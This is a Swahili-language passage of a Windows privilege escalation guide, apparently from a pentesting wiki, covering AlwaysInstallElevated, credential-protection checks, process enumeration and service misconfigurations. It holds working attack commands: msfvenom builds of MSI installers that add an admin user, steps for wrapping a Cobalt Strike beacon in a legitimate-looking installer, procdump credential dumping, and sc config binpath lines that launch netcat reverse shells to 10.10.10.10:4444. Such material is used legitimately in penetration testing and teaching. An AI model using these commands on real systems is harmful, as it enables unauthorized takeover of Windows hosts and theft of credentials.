## AlwaysInstallElevated

**Ikiwa** funguo hizi 2 za registry **zimewezeshwa** (thamani ni **0x1**), basi watumiaji wa kiwango chochote cha ruhusa wanaweza **kusakinisha** (kutekeleza) faili za `*.msi` kama NT AUTHORITY\\**SYSTEM**.

```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

### Metasploit payloads

```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac won't be prompted
```

Ikiwa una kipindi cha meterpreter, unaweza kujiendeshea mbinu hii kwa kutumia moduli **`exploit/windows/local/always_install_elevated`**

### PowerUP

Tumia amri ya `Write-UserAddMSI` kutoka power-up kuunda kwenye saraka ya sasa faili ya binary ya Windows MSI kwa ajili ya kuongeza haki. Skripti hii huandika kisakinishi cha MSI kilichokusanywa awali, ambacho hukuomba uongeze mtumiaji/kikundi (kwa hivyo utahitaji ufikiaji wa GIU):

```
Write-UserAddMSI
```

Tekeleza tu binary iliyoundwa ili kuongeza kiwango cha ruhusa.

### MSI Wrapper

Soma mafunzo haya ili ujifunze jinsi ya kuunda MSI wrapper kwa kutumia zana hizi. Kumbuka kuwa unaweza kufunga faili ya "**.bat**" ikiwa **unataka tu** **kutekeleza** **command lines**.

{{#ref}}
msi-wrapper.md
{{#endref}}

### Unda MSI kwa WIX


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Unda MSI kwa Visual Studio

- **Tengeneza** payload mpya ya Windows EXE TCP kwa Cobalt Strike au Metasploit katika `C:\privesc\beacon.exe`
- Fungua **Visual Studio**, chagua **Create a new project** na uandike "installer" kwenye kisanduku cha kutafutia. Chagua mradi wa **Setup Wizard** na ubofye **Next**.
- Ipe mradi jina, kama **AlwaysPrivesc**, tumia **`C:\privesc`** kama eneo, chagua **place solution and project in the same directory**, kisha ubofye **Create**.
- Endelea kubofya **Next** hadi ufike hatua ya 3 kati ya 4 (chagua faili za kujumuisha). Bofya **Add** na uchague payload ya Beacon uliyotengeneza hivi punde. Kisha bofya **Finish**.
- Chagua mradi wa **AlwaysPrivesc** katika **Solution Explorer** na kwenye **Properties**, badilisha **TargetPlatform** kutoka **x86** hadi **x64**.
  - Kuna sifa nyingine unazoweza kubadilisha, kama vile **Author** na **Manufacturer**, ambazo zinaweza kufanya programu iliyosakinishwa ionekane halali zaidi.
- Bofya mradi kwa kitufe cha kulia na uchague **View > Custom Actions**.
- Bofya **Install** kwa kitufe cha kulia na uchague **Add Custom Action**.
- Bofya mara mbili **Application Folder**, chagua faili yako ya **beacon.exe** na ubofye **OK**. Hii itahakikisha kuwa payload ya beacon inatekelezwa mara tu kisakinishi kinapoendeshwa.
- Chini ya **Custom Action Properties**, badilisha **Run64Bit** kuwa **True**.
- Mwishowe, **ijenge**.
  - Ikiwa onyo `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'` litaonekana, hakikisha umeweka platform kuwa x64.

### Usakinishaji wa MSI

Ili kutekeleza **usakinishaji** wa faili hasidi ya `.msi` **kwa nyuma**:

```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```

Ili ku-exploit udhaifu huu unaweza kutumia: _exploit/windows/local/always_install_elevated_

## Antivirus na Vigunduzi

### Mipangilio ya Ukaguzi

Mipangilio hii huamua kinachorekodiwa, kwa hiyo unapaswa kuizingatia.

```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```

### WEF

Windows Event Forwarding, inavutia kujua logs hutumwa wapi.

```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```

### LAPS

**LAPS** imeundwa kwa ajili ya **kusimamia nywila za Administrator za ndani**, ikihakikisha kwamba kila nywila ni **ya kipekee, inazalishwa bila mpangilio, na inasasishwa mara kwa mara** kwenye kompyuta zilizounganishwa kwenye domain. Nywila hizi huhifadhiwa kwa usalama ndani ya Active Directory na zinaweza kufikiwa tu na watumiaji waliopewa ruhusa za kutosha kupitia ACLs, zinazowaruhusu kuona nywila za admin za ndani ikiwa wameidhinishwa.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

Ikiwa imewashwa, **nywila za maandishi wazi huhifadhiwa kwenye LSASS** (Local Security Authority Subsystem Service).\
[**Maelezo zaidi kuhusu WDigest kwenye ukurasa huu**](../stealing-credentials/credentials-protections.md#wdigest).

```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```

### LSA Protection

Kuanzia **Windows 8.1**, Microsoft ilianzisha ulinzi ulioimarishwa wa Local Security Authority (LSA) ili **kuzuia** michakato isiyoaminika kujaribu **kusoma kumbukumbu yake** au kuingiza msimbo, na hivyo kuimarisha zaidi usalama wa mfumo.\
[**More info about LSA Protection here**](../stealing-credentials/credentials-protections.md#lsa-protection).

```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```

### Credentials Guard

**Credential Guard** ilianzishwa katika **Windows 10**. Madhumuni yake ni kulinda credentials zilizohifadhiwa kwenye kifaa dhidi ya vitisho kama vile mashambulizi ya pass-the-hash. [**Maelezo zaidi kuhusu Credential Guard yanapatikana hapa.**](../stealing-credentials/credentials-protections.md#credential-guard)

```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```

### Vitambulisho Vilivyohifadhiwa kwenye Akiba

**Vitambulisho vya domain** huthibitishwa na **Local Security Authority** (LSA) na hutumiwa na vipengele vya mfumo wa uendeshaji. Data ya kuingia ya mtumiaji inapothibitishwa na security package iliyosajiliwa, kwa kawaida vitambulisho vya domain vya mtumiaji huanzishwa.\
[**Maelezo zaidi kuhusu Vitambulisho Vilivyohifadhiwa kwenye Akiba hapa**](../stealing-credentials/credentials-protections.md#cached-credentials).

```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```

## Watumiaji na Vikundi

### Orodhesha Watumiaji na Vikundi

Unapaswa kuangalia kama kuna vikundi ulivyomo vyenye ruhusa za kuvutia.

```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```

### Makundi yenye privileges

Ikiwa wewe ni mwanachama wa **kundi lenye privileges**, unaweza kuweza kuongeza privileges. Jifunze kuhusu makundi yenye privileges na jinsi ya kuyatumia vibaya kuongeza privileges hapa:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Udanganyifu wa token

**Jifunze zaidi** kuhusu **token** ni nini katika ukurasa huu: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
Angalia ukurasa ufuatao ili **ujifunze kuhusu token zinazovutia** na jinsi ya kuzitumia vibaya:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### Watumiaji walioingia / Sessions

```bash
qwinsta
klist sessions
```

### Folda za nyumbani

```bash
dir C:\Users
Get-ChildItem C:\Users
```

### Sera ya Nenosiri

```bash
net accounts
```

### Pata maudhui ya ubao wa kunakili

```bash
powershell -command "Get-Clipboard"
```

## Michakato Inayoendeshwa

### Ruhusa za Faili na Folda

Kwanza, unapoorodhesha michakato, **angalia kama kuna nywila ndani ya command line ya mchakato**.\
Angalia kama unaweza **kubadilisha binary inayoendeshwa** au kama una ruhusa za kuandika kwenye folda ya binary ili kutumia uwezekano wa mashambulizi ya [**DLL Hijacking**](dll-hijacking/index.html):

```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```

Kagua kila wakati kama kuna [**electron/cef/chromium debuggers** zinazoendesha, unaweza kuzitumia vibaya ili kuongeza priviliji](../../linux-hardening/software-information/electron-cef-chromium-debugger-abuse.md).

Kisikliza cha debugger kinaweza kuwa hai kwa muda mfupi, kwa hivyo kutokuwepo kwake kwenye snapshot moja ya port zilizochunguzwa kwa njia tulivu hakuthibitishi kwamba hakikuwahi kufikiwa. Linganisha kisikliza chochote kilichoonekana na PID yake, mmiliki wa mchakato, na uwezo wa mtumiaji mwenye priviliji za chini kukifikia; jina la programu au debug flag pekee havithibitishi uwezekano wa kutekeleza code baina ya watumiaji. Fanya enumeration ya kawaida kwa njia tulivu badala ya kutuma amri za debugger.

**Kukagua ruhusa za binaries za michakato**

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
	for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
		icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
	)
)
```

**Kukagua ruhusa za folda za binary za michakato (**[**DLL Hijacking**](dll-hijacking/index.html)**)****

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
	icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```

### Saraka za Snort dynamic preprocessor

Snort 2 inaweza kupakia shared libraries kutoka kwenye `dynamicpreprocessor directory` iliyotajwa kwenye configuration iliyochaguliwa kwa `snort.exe -c <config>`. Kwa scheduled task au service inayoendesha Snort kwa akaunti tofauti, kagua configuration hiyo mahususi na ACL ya saraka ya modules iliyotajwa. Ikiwa token yako inaweza kuunda faili humo, njia hiyo inafaa kuchunguzwa kama uwezekano wa code execution wakati task au service hiyo itakapopakia modules tena. Thibitisha privileges halisi za akaunti ya run-as, configuration inayotumika, ulinganifu wa modules, na vizuizi vyovyote vya deny au share; saraka inayoweza kuandikiwa peke yake haithibitishi privilege escalation. [Nyaraka za Snort kuhusu dynamic-preprocessor](https://www.snort.org/documents/dpx-readme) zinaeleza upakiaji wa modules wakati wa runtime.

### Web service yenye privileges ya juu na document root inayoweza kuandikiwa

Kwenye usakinishaji wa Windows Apache, linganisha njia ya executable ya service na akaunti yake ya run-as na `DocumentRoot` iliyo kwenye `httpd.conf` inayotumika. Kwa mpangilio wa kawaida wa XAMPP, kagua `C:\xampp\apache\conf\httpd.conf` na ACL ya document root iliyosanidiwa, ambayo mara nyingi ni `C:\xampp\htdocs`. Ikiwa mtumiaji mwenye privileges za chini anaweza kuunda faili kwenye root hiyo huku Apache ikiendeshwa kama `LocalSystem`, code execution ya upande wa server inaweza kuvuka mpaka wa privileges wa host. Thibitisha kuwa service inaendeshwa, kuwa njia hiyo mahususi inatolewa, na kuwa handler ya upande wa server inachakata aina hiyo ya faili; root inayoweza kuandikiwa peke yake inathibitisha uundaji wa faili tu. Kagua ACL bila kuandika faili ya majaribio:

```powershell
Get-CimInstance Win32_Service -Filter "Name='Apache2.4'" | Select-Object Name, State, StartName, PathName
Select-String -Path 'C:\xampp\apache\conf\httpd.conf' -Pattern '^\s*DocumentRoot\s+'
icacls 'C:\xampp\htdocs'
```

Kwa usakinishaji wa kawaida wa WAMP, service inaweza kuelekeza kwenye toleo maalum la `C:\wamp64\bin\apache\apache*\bin\httpd.exe` (au `C:\wamp\...` kwa mpangilio wa 32-bit), huku usanidi ukiwa karibu nayo chini ya `conf\httpd.conf` na root chaguomsingi ikiwa `C:\wamp64\www` au `C:\wamp\www`. Kagua pamoja image halisi ya service, utambulisho inayotumia kuendesha, `DocumentRoot` inayotumika (ikiwemo upanuzi wa `${INSTALL_DIR}` na mipangilio ya ziada ya virtual host), na ACL ya root. Kuweza kuandika kwenye saraka ya WAMP hakuthibitishi kuwa Apache inaendeshwa kama `SYSTEM` au itatekeleza faili iliyowasilishwa. [Apache inaeleza jinsi Windows service huchagua usanidi wake](https://httpd.apache.org/docs/2.4/platform/windows.html#winnt-service).

### Root ya IIS inayoweza kuandikwa na utambulisho wa mtandao wa application pool

Kwa IIS, linganisha saraka halisi inayoweza kuandikwa na **site/application inayotumika** katika `applicationHost.config`, kisha tambua pool iliyosanidiwa na handler ya upande wa server. Msimbo uliowekwa kwenye saraka inayotolewa huendeshwa kama pool tu ikiwa IIS inachakata aina hiyo ya faili na route inaweza kufikiwa. Kagua ruhusa halisi za mtumiaji wa sasa za kuunda faili, hali ya uendeshaji ya site, handler na mipangilio ya kila path kabla ya kudhani kuwa saraka inayoweza kuandikwa inaruhusu utekelezaji wa msimbo.

Dynamic compilation ya ASP.NET inafungua njia tofauti ya kuchunguza: faili zinazozalishwa katika saraka ya compilation ya programu. Chaguomsingi ni saraka ya `Temporary ASP.NET Files` ndani ya usakinishaji husika wa .NET Framework, lakini `<compilation tempDirectory>` ya programu inaweza kuibadilisha. [Microsoft inaeleza mahali ilipo na saraka zake ndogo kwa kila programu](https://learn.microsoft.com/en-us/previous-versions/aspnet/ms366723%28v%3Dvs.100%29) na [inapendekeza kutenganisha saraka za compilation ikiwa application pool haziaminiani](https://learn.microsoft.com/en-us/iis/manage/creating-websites/provisioning-iis-7-sites-for-shared-hosting#configuring-aspnet-temporary-compilation-directories). Ikiwa tokeni yenye ruhusa za chini inaweza kubadilisha source iliyozalishwa kwenye cache ya **programu husika**, bainisha kama programu hiyo ita-compile upya chini ya [utambulisho wa worker process](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities) wenye ruhusa za juu zaidi. ACL ya faili au saraka pekee haithibitishi utekelezaji wa msimbo: linganisha cache na programu inayotumika, tokeni na ACL halisi, mipangilio ya compilation, utambulisho wa process, na muda wa compilation yoyote upya. Tumia ukaguzi wa metadata wa kusoma tu; usichochee compilation wala kubadilisha faili za cache wakati wa enumeration.

IIS pool iliyosanidiwa kama `ApplicationPoolIdentity` au `NetworkService` kwa kawaida hujithibitisha kwa rasilimali za domain kwa kutumia **akaunti ya kompyuta ya host**, hata kama tokeni yake ya ndani ina ruhusa za chini. `LocalSystem` tayari ina ruhusa za juu ndani ya kompyuta na pia hutumia akaunti ya kompyuta kwenye mtandao; `LocalService` kwa kawaida hutumia vitambulisho vya mtandao visivyojulikana. Pool ya `SpecificUser` hutumia akaunti yake iliyosanidiwa. [Microsoft inaeleza aina hizi za utambulisho](https://learn.microsoft.com/en-us/iis/configuration/system.applicationhost/applicationpools/add/processmodel) na [utambulisho wa mtandao wa application pool](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities). Mpangilio wa utambulisho usipoainishwa unaweza kurithi chaguomsingi za pool, ambazo hutofautiana kati ya matoleo ya IIS, kwa hiyo tambua usanidi halisi badala ya kubashiri kutokana na jina la pool. Ikiwa utekelezaji wa msimbo unafikia pool yenye utambulisho wa mtandao wa akaunti ya kompyuta, tathmini ruhusa za directory za **kompyuta hiyo mahsusi**. [DCSync](../active-directory-methodology/dcsync.md) huhitaji ruhusa za replication kwenye domain naming context; ticket ya akaunti ya mashine au jukumu la host pekee havithibitishi ruhusa hizo. Enumeration tulivu inapaswa kukagua usanidi na ACL bila kupakia faili, kuanzisha uthibitishaji wa mtandao, au kuomba ticket.

Kwa ASP.NET handler inayosomeka na inayoanzisha helper process, fuatilia thamani yoyote inayotokana na request kupitia uthibitishaji, usimbuaji, uhakiki na uundaji wa command. Handler inayounganisha tokeni iliyodecodeiwa kwenye `ProcessStartInfo("cmd", "/c ...")` inaweza kuruhusu alama maalum za shell kubadilisha command; [Microsoft inaeleza herufi maalum za `cmd`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/cmd). Thibitisha kuwa mpigaji asiyeaminika anaweza kuathiri thamani iliyodecodeiwa na kufikia handler, kisha tambua utambulisho halisi wa application pool au wa kujifanya mtumiaji mwingine, pamoja na utambulisho wa child process. Mstari wa source unaosomeka, listener ya localhost, au udhaifu wa muundo wa tokeni pekee havithibitishi utekelezaji wa command wenye ruhusa za juu. Kagua source na usanidi wa pool bila kutuma requests ghushi wala kuendesha helper wakati wa enumeration tulivu.

Kwa PHP service kwenye Windows, path inayodhibitiwa na request na kupitishwa kwa [`include` au `require`](https://www.php.net/manual/en/function.include.php) inaweza kutekeleza faili ya PHP inayoweza kuandikwa na mtumiaji mwenye ruhusa za chini, kwa kutumia utambulisho wa worker. Thibitisha kuwa request inaweza kufikia kauli hiyo, path iliyotatuliwa inaelekeza kwenye faili ambayo mtumiaji mwenye ruhusa za chini anaweza kubadilisha na worker anaweza kusoma, vizuizi husika vya PHP vya path vinaruhusu include, na worker inaendeshwa kwa ruhusa za juu zaidi. Listener ya loopback au faili inayoweza kuandikwa pekee haithibitishi mlolongo huu; kagua source, utambulisho wa service na ACL za faili bila kuita endpoint wakati wa enumeration tulivu.

### Uchimbaji wa nywila kwenye kumbukumbu

Unaweza kuunda memory dump ya process inayoendeshwa kwa kutumia **procdump** kutoka sysinternals. Service kama FTP huwa na **credentials katika maandishi wazi kwenye kumbukumbu**; jaribu kutupa kumbukumbu na kusoma credentials.

```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```

### Programu za GUI zisizo salama

**Programu zinazoendeshwa kama SYSTEM zinaweza kumruhusu mtumiaji kufungua CMD au kuvinjari saraka.**

Mfano: "Windows Help and Support" (Windows + F1), tafuta "command prompt", bofya "Click to open Command Prompt"

### Uingizaji wa faili za project zenye mamlaka ya juu

Programu inayofungua kiotomatiki project kutoka kwenye saraka ya kudondoshea faili ambayo mtumiaji wa chini anaweza kuandika ndani yake huvuka mpaka wa uaminifu wa ingizo chini ya akaunti ya programu inayoziingiza. Kagua **njia halisi inayoweza kuandikwa**, mchakato au task inayoifungua, utambulisho wake halisi, na build ya parser. [Tatizo la kihistoria la kufungua/kurejesha project ya Ghidra](https://github.com/NationalSecurityAgency/ghidra/issues/71) liliruhusu XML external entities kwenye metadata ya project; entity ya mtandao kwenye Windows ingeweza kusababisha uthibitishaji kutoka kwa akaunti inayoingiza project ikiwa [sera za outbound SMB na NTLM](https://learn.microsoft.com/en-us/windows-server/storage/file-server/smb-ntlm-blocking) zinaruhusu. Hii ni dalili ya uwezekano wa kufichuka kwa vitambulisho, si ufikiaji wa msimamizi wa papo hapo: jibu lazima liweze kutumika kupitia njia tofauti iliyoidhinishwa au yenye udhaifu, na build za sasa lazima zikaguliwe kulingana na hali yake halisi ya patch. Usifungue project iliyotengenezwa mahsusi wakati wa upelelezi usio na mabadiliko; kagua mtiririko wa uingizaji na ACL.

## Huduma

Haki ya [`SC_MANAGER_CREATE_SERVICE`](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights) ya kitu cha Service Control Manager (SCM) ni tofauti na haki za huduma iliyopo. Ombi lililofanikiwa la kusoma tu la [`OpenSCManager`](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-openscmanagerw) la kupata haki hiyo ni dalili inayofaa kukaguliwa, si uthibitisho kwamba huduma mpya inaweza kuendeshwa. [`CreateService` hurudisha handle](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-createservicew) yenye haki za huduma zilizoombwa wakati wa uundaji; kufungua huduma tena baadaye hufanya ukaguzi tofauti wa ufikiaji na kunaweza kushindwa hata kama handle ya awali ingeweza kutumika. Thibitisha tokeni halisi ya ndani au ya mbali, haki zilizotolewa kwa handle, akaunti ya huduma, sera ya kuanzisha, na njia ya executable kando kando. Usitengeneze wala kuanzisha huduma wakati wa upelelezi usio na mabadiliko.

Kwa njia ya kusakinisha huduma kwa mbali, linganisha haki hizo za SCM na share kwenye target ambayo **logon hiyo hiyo ya mtandao** inaweza kuandikia, ACL yake ya msingi ya NTFS, na njia ya ndani ya executable ambayo akaunti ya huduma inaweza kuendesha. Akaunti isiyo ya admin inaweza kuvuka mpaka huu ikiwa kuna haki pana za SCM zisizo za kawaida na njia ya kuweka faili; share ya kiutawala si sharti la lazima. Ufikiaji wa kuandika kwenye share pekee, au dalili ya kuunda huduma kupitia SCM pekee, haithibitishi kwamba huduma mpya inaweza kuanzishwa kwa utambulisho wa juu zaidi.

Huduma iliyopo inaweza kuita executable saidizi wakati wa kuanzisha, kuzima au tukio jingine la mzunguko wa maisha, hata kama executable hiyo haipo kwenye `ImagePath` yake. Ikiwa jina la executable saidizi linatatuliwa kuwa saraka ambayo mtumiaji wa chini anaweza kuandikia na huduma inaendeshwa kwa utambulisho wa juu zaidi, kukosekana kwa faili hiyo kunaweza kuwa fursa ya uingizwaji, kwa masharti fulani. Thibitisha **msimbo halisi wa huduma au mwito wa helper ulioandikwa kwenye nyaraka**, njia ya executable inayotatuliwa na mpangilio wa utafutaji, haki za kuunda saraka, utambulisho wa huduma, na trigger ya mzunguko wa maisha inayopatikana. Saraka ya huduma inayoweza kuandikwa au faili inayokosekana pekee haithibitishi kwamba huduma itapakia faili hiyo; ukaguzi usio na mabadiliko haupaswi kuanzisha wala kusimamisha huduma.

Kwa huduma iliyopo, [`SERVICE_START` huruhusu kutoa argument kwa `StartService`](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-startservicew); ni tofauti na [`SERVICE_CHANGE_CONFIG`](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights). Kagua msimbo wa huduma au kiolesura chake kilichoandikwa kwenye nyaraka kabla ya kuchukulia haki ya kuianzisha kuwa zaidi ya haki ya kuidhibiti. Ikiwa inatumia argument iliyochaguliwa na mpigaji kama njia ya logi au export, thibitisha utambulisho wa huduma, mtiririko halisi wa argument hadi uandishi, vizuizi vya njia, na ruhusa za **faili linaloundwa**. Kuandika kwenye saraka iliyolindwa kunaweza kuwa njia ya escalation tu ikiwa kuna consumer au loader tofauti yenye mamlaka ya juu inayokubali faili hilo; logi inayoweza kuandikwa au haki ya kuanzisha pekee haitoshi. Orodha ya ukaguzi isiyo na mabadiliko haipaswi kuanzisha huduma wala kuunda faili la majaribio.

Kwa agent ya ufuatiliaji ya NSClient++, `nsclient.ini` inayosomeka ni **dalili ya kukagua usanidi**: inaweza kuwa na vitambulisho vya web, huku `boot.ini` ikielekeza usanidi kwenye eneo jingine. Kagua akaunti halisi ya huduma, listener ya WEB na sera ya ufikiaji, na ikiwa role iliyothibitishwa inaweza kubadilisha mipangilio au scripts. Utekelezaji wa mamlaka ya juu pia unahitaji `CheckExternalScripts` (au njia nyingine ya utekelezaji iliyowezeshwa), haki halisi ya kusajili au kurekebisha command, na trigger inayoiendesha chini ya utambulisho wa huduma. Listener inayopatikana tu kupitia loopback bado inaweza kufikiwa na mtumiaji wa ndani, lakini njia ya faili, password, au listener pekee haithibitishi kuwa haki hizo zipo. Kagua metadata na ruhusa bila kuonyesha siri au kuita web API wakati wa upelelezi usio na mabadiliko. Tazama [mpangilio wa faili wa NSClient++](https://nsclient.org/docs/concepts/file-layout/), [mwongozo wa usalama wa web na script](https://nsclient.org/docs/setup/securing/), na [usanidi wa external-script](https://nsclient.org/docs/reference/check/CheckExternalScripts/).

Kwa huduma ambayo `ImagePath` yake ni `nssm.exe`, kagua akaunti halisi inayoendesha huduma na thamani yake ya `HKLM\SYSTEM\CurrentControlSet\Services\<name>\Parameters\Application`: [NSSM huhifadhi child application hapo](https://git.nssm.cc/nssm/nssm/src/96e7f4484a3dc962482c240909fd52b0e0226a60/registry.h), huku `AppDirectory` ikiwa saraka yake ya kazi iliyosanidiwa. Kagua executable ya child na ACL za saraka zake za mzazi kabla ya kuchukulia ruhusa za wrapper kuwa mpaka wote wa huduma. Endpoint ya ndani ya WCF au SOAP inayofichuliwa na child hiyo ni dalili tofauti ya kukaguliwa: thibitisha kuwa mtumiaji mwenye mamlaka ya chini anaweza kufikia listener, operation husika inakubali ingizo lake, na child ya huduma inatekeleza operation isiyo salama chini ya utambulisho wa juu zaidi. Akaunti ya huduma, URL ya endpoint, au njia inayoweza kuandikwa pekee haithibitishi escalation; epuka kuita operations za huduma wakati wa upelelezi usio na mabadiliko.

Kwa operation maalum ya WCF, fuatilia string inayodhibitiwa na mpigaji hadi kwenye PowerShell runspace yoyote. [`Pipeline.Commands.AddScript` huongeza maandishi ya script](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.commandcollection.addscript), na [`Pipeline.Invoke` huendesha pipeline](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.pipeline.invoke). [`netTcpBinding` yenye Windows transport credentials](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/wcf/transport-of-nettcpbinding) huthibitisha utambulisho wa mteja, lakini ruhusa ya kuita operation hiyo **mahususi** na utambulisho halisi wa runspace lazima vikaguliwe kando. Njia kutoka ingizo la mpigaji mwenye mamlaka ya chini hadi `AddScript` chini ya utambulisho wa huduma yenye mamlaka ya juu ni mpaka wa utekelezaji wa code; port inayosikiliza, mteja aliyethibitishwa, au method isiyotumika kwenye assembly isiyohusiana pekee si uthibitisho. Kagua huduma iliyosakinishwa, contract, uidhinishaji na mipangilio ya impersonation kwa njia tuli bila kuita endpoint wakati wa upelelezi.

Service Triggers huruhusu Windows kuanzisha huduma hali fulani zinapotokea (shughuli ya named pipe/RPC endpoint, matukio ya ETW, upatikanaji wa IP, kifaa kuunganishwa, GPO refresh, n.k.). Hata bila haki za SERVICE_START mara nyingi unaweza kuanzisha huduma zenye mamlaka ya juu kwa kusababisha triggers zake. Tazama mbinu za kuorodhesha na kuziwasha hapa:

-
{{#ref}}
service-triggers.md
{{#endref}}

### Huduma ya Visual Studio diagnostic collector

Usakinishaji wa Visual Studio wenye zana za C/C++ unaweza kuwa na `VSStandardCollectorService150`, huduma ya diagnostic iliyosanidiwa kuendeshwa kama `LocalSystem`. [CVE-2024-20656](https://www.mdsec.co.uk/2024/01/cve-2024-20656-local-privilege-escalation-in-vsstandardcollectorservice150-service/) ilitumia race ya junction na object-manager-link kuelekeza upya uwekaji upya wa DACL ya huduma. Escalation iliyoonyeshwa pia ilihitaji njia inayoweza kutumika ya kurekebisha MSI ya Visual Studio Setup WMI Provider na target yake ya `C:\ProgramData\Microsoft\VisualStudio\SetupWMI\MofCompiler.exe`. Kipengele hicho kilirekebishwa Januari 2024.

Kwa uchunguzi wa awali usio na mabadiliko, kagua akaunti na njia ya binary ya huduma hiyo, angalia ikiwa njia ya Setup WMI compiler ipo, na thibitisha hali ya patch ya kipengele kilichosakinishwa. Ingizo la huduma, toleo la bidhaa ya Visual Studio, au faili la compiler pekee havithibitishi kuwa host ina udhaifu. Ukaguzi hauhitaji kuanzisha huduma wala kuendesha repair.

Pata orodha ya huduma:

```bash
net start
wmic service list brief
sc query
Get-Service
```

### Ruhusa

Unaweza kutumia **sc** kupata taarifa kuhusu huduma

```bash
sc qc <service_name>
```

Inapendekezwa kuwa na binary **accesschk** kutoka _Sysinternals_ ili kuangalia kiwango cha privilege kinachohitajika kwa kila service.

```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```

Inapendekezwa kuangalia ikiwa "Authenticated Users" wanaweza kurekebisha huduma yoyote:

```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```

[Unaweza kupakua accesschk.exe ya XP hapa](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Washa huduma

Ikiwa unapata hitilafu hii (kwa mfano, na SSDPSRV):

_Hitilafu ya mfumo 1058 imetokea._\
_Huduma haiwezi kuanzishwa kwa sababu imezimwa au hakuna vifaa vilivyowashwa vinavyohusishwa nayo._

Unaweza kuiwasha kwa kutumia

```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```

**Zingatia kwamba huduma ya upnphost inategemea SSDPSRV ili kufanya kazi (kwa XP SP1)**

**Njia nyingine ya kutatua tatizo hili** ni kuendesha:

```
sc.exe config usosvc start= auto
```

### **Rekebisha njia ya binary ya service**

Katika hali ambapo kundi la "Authenticated users" lina **SERVICE_ALL_ACCESS** kwenye service, inawezekana kurekebisha binary ya executable ya service. Ili kurekebisha na kutekeleza **sc**:

```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```

### Anzisha upya huduma

```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```

Ruhusa mbalimbali zinaweza kutumiwa kuongeza privileges:

- **SERVICE_CHANGE_CONFIG**: Huruhusu kusanidi upya binary ya service.
- **WRITE_DAC**: Huruhusu kusanidi upya ruhusa, na hivyo kuwezesha kubadilisha usanidi wa service.
- **WRITE_OWNER**: Huruhusu kupata umiliki na kusanidi upya ruhusa.
- **GENERIC_WRITE**: Hutoa pia uwezo wa kubadilisha usanidi wa service.
- **GENERIC_ALL**: Hutoa pia uwezo wa kubadilisha usanidi wa service.

